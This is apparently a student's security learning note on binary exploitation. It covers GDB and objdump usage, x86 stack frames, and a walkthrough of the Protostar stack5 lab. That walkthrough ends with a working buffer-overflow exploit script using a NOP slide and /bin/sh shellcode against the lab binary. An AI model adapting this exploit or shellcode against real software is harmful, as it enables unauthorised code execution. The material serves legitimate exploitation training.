# Security Learning Note

## Binary Exploitation

### GDB

#### Learning Sources
+ [LiveOverflow Youtube channel](https://www.youtube.com/watch?v=VroEiMOJPm8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=7&t=0s)

#### Before Cracking
+ ```file```: determine file type
+ ```strings```: print the sequences of printable characters in files

#### Basic disassembler and register tricks

+ ```set disassembly-flavor intel```: a more readable style
+ ```disassemble main```: display all assembler instructions of the ```main``` function
+ ```break *address```: for example, ```break *main```
+ ```si```: step one instruction
+ ```info registers```:
    - ```rip / eip```: instruction pointer (program counter)
    - ```eax```: the first 32 bits of the 64-bit ```rax``` register
+ ```set $eax=0```: set the register ```eax``` to 0
+ ```info proc mapping```: report the memory address space ranges accessible in a process.
+ x command: examine the content of a memory address [reference](https://visualgdb.com/gdbreference/commands/x)
+ define a "hook", example:
  ```
  (gdb) define hook-stop
  Type commands for definition of "hook-stop".
  End with a line saying just "end".
  >info registers
  >x/32wx $esp+0x1c
  >x/2i $eip
  >end
  ```

### objdump
+ ```objdump -d $FILENAME```: disassembler
+ ```objdump -x $FILENAME```: print header information

### strace & ltrace
+ ```strace```: trace system calls
+ ```ltrace```: trace library calls

### Other useful tools

+ Radare2, Ghidra, ...

### Parser Differential
+ Use fuzzing technique to make a program failed to be parsed by gdb, radare2, or whatever but able to be executed by ```execve```.

### Stack

+ ebp / rbp: contains the address of the bottom of the stack
+ esp / rsp: contains the address the top of the stack
+ When enter a function:
    ```
    push   ebp
    mov    ebp,esp
    and    esp,0xfffffff0
    ```
  (mask out the last 4 bits of esp is for alignment)

+ Procedures of calling a function:
    1. (old func) push the paramters to be passed on the stack
    2. (old func) push the next instruction to be executed on the stack
    3. (old func) execute ```call`` instruction
    4. (new func) push the value of *ebp* on the stack
    5. (new func) set *ebp* to the value of *esp*
    6. (new func) align the value of *esp*
    7. (new func) substract *esp* to create stack frame

+ Procedures of returning from a function:
    1. ```leave``` instruction: ```mov esp, ebp``` then ```pop ebp```
    2. ```ret``` instruction: get the next instruction pointer, which is on the top of the stack (pop)


### Protostar

#### [stack5](https://exploit.education/protostar/stack-five/)

1. calculate the length of padding
2. determine the value of *ebp* (does not matter in this problem)
3. determine the value of *eip*: where to place our shell code? (right after *$eip*)
4. add NOP(opcode: ```0x90```) slide: the address may not be the same every time since the data pushed on the stack can be different (e.g. environment variables)
    - make the *eip* point to the middle of the NOP slide (the exact position is not sure)
5. add shellcode: copy from [shell-storm](http://shell-storm.org/shellcode/)

!!! info
    use ```int3```(opcode: ```0xCC```) instruction to debug shellcode

!!! warning
    ```python exploit.py | /opt/protostar/bin/stack5``` does not work because when exploit.py terminates, the pipe is closed at the mean time. Thus, we should use ```cat``` to create a new pipe:
    ```bash
    (python exploit.py; cat) | /opt/protostar/bin/stack5
    ```

```python
import struct

padding = 'A' * 72
ebp = 'AAAA'
eip = struct.pack('I', 0xbffff6e0+40)
nopslide = '\x90' * 100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + ebp + eip + nopslide + shellcode
```